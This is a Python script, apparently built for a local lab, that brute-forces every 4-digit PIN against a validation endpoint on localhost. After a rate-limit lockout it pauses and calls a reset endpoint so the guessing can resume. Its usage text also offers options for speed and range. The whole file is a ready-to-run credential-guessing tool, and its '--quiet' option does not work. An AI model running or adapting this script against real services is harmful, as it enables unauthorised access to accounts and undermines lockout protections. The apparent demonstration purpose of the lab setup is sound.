#!/usr/bin/env python3
"""
Brute Force Attack Script
Systematically attempts all 4-digit PIN combinations against the service.
"""

import requests
import time
import json
from datetime import datetime
import sys

# Configuration
SERVICE_URL = "http://localhost:5000"
VALIDATE_ENDPOINT = f"{SERVICE_URL}/validate"
STATS_ENDPOINT = f"{SERVICE_URL}/stats"
RESET_ENDPOINT = f"{SERVICE_URL}/reset"

# Attack parameters
VERBOSE = True
DELAY_BETWEEN_ATTEMPTS = 0  # seconds (0 = no delay)
MAX_PINS = 10000  # Limit attempts to prevent infinite loops

class BruteForceAttacker:
    def __init__(self, service_url=SERVICE_URL, delay=0):
        self.service_url = service_url
        self.delay = delay
        self.attempts = 0
        self.successful_pin = None
        self.start_time = None
        self.end_time = None
        self.results = []
    
    def attempt_pin(self, pin):
        """Attempt to validate a single PIN."""
        try:
            response = requests.post(
                VALIDATE_ENDPOINT,
                json={"pin": str(pin).zfill(4)},
                timeout=5
            )
            
            self.attempts += 1
            
            result = {
                "attempt": self.attempts,
                "pin": str(pin).zfill(4),
                "status_code": response.status_code,
                "response": response.json(),
                "timestamp": datetime.now().isoformat()
            }
            self.results.append(result)
            
            if response.status_code == 200:
                self.successful_pin = str(pin).zfill(4)
                if VERBOSE:
                    print(f"✅ SUCCESS! PIN found: {self.successful_pin} (Attempt #{self.attempts})")
                return True
            elif response.status_code == 429:
                if VERBOSE:
                    print(f"🔒 LOCKED OUT: {response.json().get('message')}")
                return None  # Locked out
            else:
                if VERBOSE and self.attempts % 100 == 0:
                    print(f"⏳ Attempt #{self.attempts}: {str(pin).zfill(4)} - Incorrect")
                return False
        
        except requests.exceptions.ConnectionError:
            print("❌ Connection error: Service is not running.")
            return None
        except Exception as e:
            print(f"❌ Error: {e}")
            return None
    
    def run_attack(self, start=0, end=9999):
        """Run the brute force attack."""
        print(f"\n🚀 Starting brute force attack...")
        print(f"   Target: {self.service_url}")
        print(f"   PIN range: {start:04d} - {end:04d}")
        print(f"   Delay between attempts: {self.delay}s\n")
        
        self.start_time = datetime.now()
        
        for pin in range(start, min(end + 1, MAX_PINS)):
            result = self.attempt_pin(pin)
            
            if result is True:  # Found the PIN
                break
            elif result is None:  # Locked out
                print("\n⏸️  Waiting for lockout to expire...")
                time.sleep(65)  # Wait for lockout to expire (60s + 5s buffer)
                # Reset the service to continue
                try:
                    requests.post(RESET_ENDPOINT)
                    print("🔄 Service reset. Resuming attack...\n")
                except:
                    pass
            
            if self.delay > 0:
                time.sleep(self.delay)
        
        self.end_time = datetime.now()
        self.print_summary()
    
    def print_summary(self):
        """Print attack summary."""
        duration = (self.end_time - self.start_time).total_seconds()
        rate = self.attempts / duration if duration > 0 else 0
        
        print("\n" + "="*50)
        print("📊 BRUTE FORCE ATTACK SUMMARY")
        print("="*50)
        print(f"Total attempts:     {self.attempts}")
        print(f"Duration:           {duration:.2f} seconds")
        print(f"Attempts/second:    {rate:.2f}")
        
        if self.successful_pin:
            print(f"\n✅ PIN FOUND: {self.successful_pin}")
        else:
            print(f"\n❌ PIN NOT FOUND")
        
        print("="*50 + "\n")
    
    def save_results(self, filename="attack_results.json"):
        """Save detailed results to file."""
        with open(filename, "w") as f:
            json.dump({
                "summary": {
                    "total_attempts": self.attempts,
                    "successful_pin": self.successful_pin,
                    "start_time": self.start_time.isoformat(),
                    "end_time": self.end_time.isoformat(),
                    "duration_seconds": (self.end_time - self.start_time).total_seconds()
                },
                "results": self.results
            }, f, indent=2)
        print(f"💾 Results saved to {filename}")

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--help":
        print("""
Usage: python brute_force_attack.py [options]

Options:
  --start <pin>   Start PIN (default: 0000)
  --end <pin>     End PIN (default: 9999)
  --delay <sec>   Delay between attempts in seconds (default: 0)
  --quiet         Suppress verbose output
  --help          Show this help message

Examples:
  python brute_force_attack.py
  python brute_force_attack.py --start 1000 --end 2000 --delay 0.1
  python brute_force_attack.py --quiet
        """)
        return
    
    # Parse arguments
    start_pin = 0
    end_pin = 9999
    delay = DELAY_BETWEEN_ATTEMPTS
    
    for i, arg in enumerate(sys.argv[1:]):
        if arg == "--start" and i + 1 < len(sys.argv) - 1:
            start_pin = int(sys.argv[i + 2])
        elif arg == "--end" and i + 1 < len(sys.argv) - 1:
            end_pin = int(sys.argv[i + 2])
        elif arg == "--delay" and i + 1 < len(sys.argv) - 1:
            delay = float(sys.argv[i + 2])
        elif arg == "--quiet":
            VERBOSE = False
    
    # Run attack
    attacker = BruteForceAttacker(delay=delay)
    attacker.run_attack(start=start_pin, end=end_pin)
    attacker.save_results()

if __name__ == "__main__":
    main()
